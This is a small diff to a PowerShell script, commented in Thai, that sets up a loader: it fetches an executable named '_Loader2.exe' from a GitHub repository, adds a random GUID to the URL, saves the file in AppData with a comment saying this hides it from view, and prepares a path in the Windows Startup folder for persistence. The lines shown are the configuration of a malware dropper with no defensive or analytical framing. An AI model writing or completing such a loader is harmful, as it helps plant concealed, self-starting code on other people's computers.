@@ -1,5 +1,5 @@
 # 1. ตั้งค่าตำแหน่งไฟล์
-$url = "https://github.com/lubyralph6-maker/newpower.ps1/raw/main/_Loader2.exe"
+$url = "https://github.com/lubyralph6-maker/newpower.ps1/raw/main/_Loader2.exe?v=$([guid]::NewGuid())"
 $destPath = "$env:APPDATA\_Loader.exe"  # เก็บไว้ใน AppData เพื่อหลบสายตา
 $startupLnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\_Loader2.exe"
 
